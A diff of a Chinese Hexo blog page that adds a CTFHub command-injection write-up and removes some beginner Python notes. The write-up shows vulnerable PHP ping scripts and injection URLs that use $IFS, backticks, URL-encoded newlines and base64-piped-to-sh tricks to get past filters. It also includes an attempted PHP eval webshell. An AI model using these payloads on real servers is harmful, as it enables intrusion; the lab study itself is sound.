+</code></pre></li>
+</ul>
+<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>长度限制可以用文件构造的方式来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。类似的还有$(command).</p>
+<blockquote>
+<p>cat$IFS<code>ls</code>    //带反引号</p>
+</blockquote>
+<blockquote>
+<p>cat$IFS$(ls)</p>
+</blockquote>
+<h3 id="综合过滤练习1"><a href="#综合过滤练习1" class="headerlink" title="综合过滤练习1"></a>综合过滤练习1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$res = <span class="keyword">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]) &amp;&amp; $_GET[<span class="string">'ip'</span>]) &#123;</span><br><span class="line">    $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">    $m = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, $ip, $m)) &#123;</span><br><span class="line">        $cmd = <span class="string">"ping -c 4 &#123;$ip&#125;"</span>;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到,过滤掉了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|   &amp;   ;   &#x2F;   cat   flag   ctfhub</span><br></pre></td></tr></table></figure>
+
+<p>好像大部分有用的都被过滤掉了,这时我们就需要换一种思路,我们使用url编码来解决[<strong>接下来所有的payload都是在hackbar上输入,直接在ping里输入没有用</strong>]</p>
+<h4 id="url编码表"><a href="#url编码表" class="headerlink" title="url编码表"></a>url编码表</h4><p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="1">)<img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt="2"></p>
+<p>其中本题用到的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%0a   换行[输入下一条命令,类似于;]</span><br><span class="line">%09   TAB[占位符,替代那些不确定字符的位置]</span><br><span class="line">%3b   ;</span><br><span class="line">%5c   \[cat被过滤了,要加\干扰]</span><br></pre></td></tr></table></figure>
+
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als#</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt="3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als%09*_is_here#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.png" alt="4"></p>
+<blockquote>
+<p>其中%09*的意思:</p>
+<p>%09作为占位符,去正则匹配被过滤的flag, *代表一个或多个字符[flag就是四个字符]</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0aca%5ct%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0abase64%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.png" alt="5"></p>
+<p>或者…</p>
+<p>这我是这么想的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1%0aecho&quot;&lt;?php@eval(\$_POST[&#39;ag&#39;])%3b?&gt;&quot;&gt;123.php#</span><br></pre></td></tr></table></figure>
+
+<p>但是好像并不成功,直接无法写入,然后我尝试者写一些普通文本到123.php或122.txt,写入倒是都可以成功写入,问题就是这些文件打不开???base64编码也没有反应,很迷,但我有招一日一定要注入进去!加油!</p>
+<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">RCE的综合过滤练习</a></p>
+<h3 id="综合过滤练习2"><a href="#综合过滤练习2" class="headerlink" title="综合过滤练习2"></a>综合过滤练习2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/l2_1.png" alt="l2_1"></p>
+<p>于是开始实验空格，最后发现$IFS$1可以成功替代空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+
+<p>但是还会过滤flag，所有就如下即可获得flag</p>
+<p><strong>方法1（内联）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2（拼接）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法3（编码）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>这个编码的方法还没有看的特别懂。。。测试还存在一些问题</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/">在kali-linux下搭建DVWA</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
 <ol>
 <li><p>解压压缩包到</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
@@ -303,88 +601,7 @@
 </li>
 <li></li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python2%E4%B8%8Epython3%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB/">python2与python3的一些区别</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><h3 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h3><ol>
-<li>python2中print语句有些包含括号，有些不含。</li>
-<li>python3中print是一个函数，因此括号必不可少。</li>
-</ol>
-<h3 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h3><ol>
-<li>python3中获取用户输入是input()</li>
-<li>python2.7里则是raw_input(),在此版本中input()将用户输入解读为代码。</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">python注意事项</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><ol>
-<li><p>如要在字符串中使用引号，则包裹字符串要用双引号，单引号不可。如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;George&#39;s personality is very optimistic!&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>变量打印时如要换行要用加号，与c语言有差别。如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(name + &quot;\n\t&quot;)   &#x2F;&#x2F;python</span><br><span class="line">printf(&quot;&amp;d\n\t&quot;,name)    &#x2F;&#x2F;C语言</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>str()函数将非字符串转为字符串以正常打印。如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age &#x3D; 23 </span><br><span class="line">message &#x3D; &quot;Happy &quot; + str(age) + &quot;rd Birthday!&quot; </span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>列表中name[-1]可访问最后一个元素。</p>
-</li>
-<li><p>变量，列表值都不要加双引号，加了引号代表字符串，直接字面打印其中内容。</p>
-</li>
-<li><p>在对列表进行增删时一定要注意一个顺序性，即你如果删除了name[0]，原来的name[1]就变成了name[0]。</p>
-</li>
-<li><p>字典里哪怕嵌套的是字典，第一个字典内都要用冒号，而非等号；而且每一个键-值后记得加逗号！<img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png" alt="1"></p>
-</li>
-<li><p>遍历字典的键-值时，一定要记得加.item()</p>
-</li>
-<li><p>如果想引用特定函数（from。。。import。。。），要在不想引用部分加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br></pre></td></tr></table></figure>
-</li>
-<li><pre><code>import xxx</code></pre><p>时，在引用类的时候记得要用   xxx.方法/属性！</p>
-<p><img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/2.png" alt="2"></p>
-</li>
-<li></li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/">python的一些简单方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><h3 id="去除空白"><a href="#去除空白" class="headerlink" title="去除空白"></a>去除空白</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rstrip()   &#x2F;&#x2F;去除尾部空白</span><br><span class="line">lstrip()   &#x2F;&#x2F;去除头部空白</span><br><span class="line">strip()    &#x2F;&#x2F;去除头尾空白</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.title()   &#x2F;&#x2F;首字母大写</span><br><span class="line">name.upper()   &#x2F;&#x2F;全部大写</span><br><span class="line">name.lower()   &#x2F;&#x2F;全部小写</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="对列表的插入与删除"><a href="#对列表的插入与删除" class="headerlink" title="对列表的插入与删除"></a>对列表的插入与删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.append(&#39;a&#39;)   &#x2F;&#x2F;在列表末尾添加元素a</span><br><span class="line">name.insert(0,&#39;a&#39;) &#x2F;&#x2F;在列表0位置添加元素a</span><br><span class="line">del name[0]        &#x2F;&#x2F;删除列表0位置元素</span><br></pre></td></tr></table></figure>
-
-<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]  </span><br><span class="line">print(motorcycles) </span><br><span class="line"></span><br><span class="line">popped_motorcycle &#x3D; motorcycles.pop()</span><br><span class="line">print(motorcycles) </span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;] </span><br><span class="line">suzuki</span><br></pre></td></tr></table></figure>
-
-<p>pop中添加数字即可添加元素到任何位置</p>
-<h4 id="根据值删除元素"><a href="#根据值删除元素" class="headerlink" title="根据值删除元素"></a>根据值删除元素</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;]  print(motorcycles) </span><br><span class="line">too_expensive &#x3D; &#39;ducati&#39; </span><br><span class="line"></span><br><span class="line">motorcycles.remove(too_expensive)  </span><br><span class="line">print(motorcycles) </span><br><span class="line">print(&quot;\nA &quot; + too_expensive.title() + &quot; is too expensive for me.&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">A Ducati is too expensive for me.</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list.sort()   &#x2F;&#x2F;对列表进行永久性排序（a-z）</span><br><span class="line">list.sort(reverse&#x3D;true)   &#x2F;&#x2F;对列表进行永久性倒叙排序（z-a）</span><br><span class="line">sorted(list)   &#x2F;&#x2F;对列表进行临时性排序</span><br><span class="line"></span><br><span class="line">list.reverse()   &#x2F;&#x2F;倒着打印列表(这玩意有点奇妙，你不能把它放print里面，像print(list.reverse())</span><br><span class="line"></span><br><span class="line">len(list)   &#x2F;&#x2F;获取列表的长度(记得打印)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">range(start_num,finish_num,step)</span><br><span class="line">list()   &#x2F;&#x2F;将括号内转化为列表</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="处理一堆数字的列表"><a href="#处理一堆数字的列表" class="headerlink" title="处理一堆数字的列表"></a>处理一堆数字的列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">min()   &#x2F;&#x2F;最大值</span><br><span class="line">max()   &#x2F;&#x2F;最小值</span><br><span class="line">sum()   &#x2F;&#x2F;总和</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set()    &#x2F;&#x2F;去除其中重复值</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.split()    &#x2F;&#x2F;以空格为界限，把字符串分割成若干块并放入列表</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="判断字符类型"><a href="#判断字符类型" class="headerlink" title="判断字符类型"></a>判断字符类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isinstance(string,type)    &#x2F;&#x2F;判断string是否是type类型，返回布尔值</span><br><span class="line">isdigit(string)            &#x2F;&#x2F;判断字符串是否为数字</span><br></pre></td></tr></table></figure>
-
-</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
 }</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
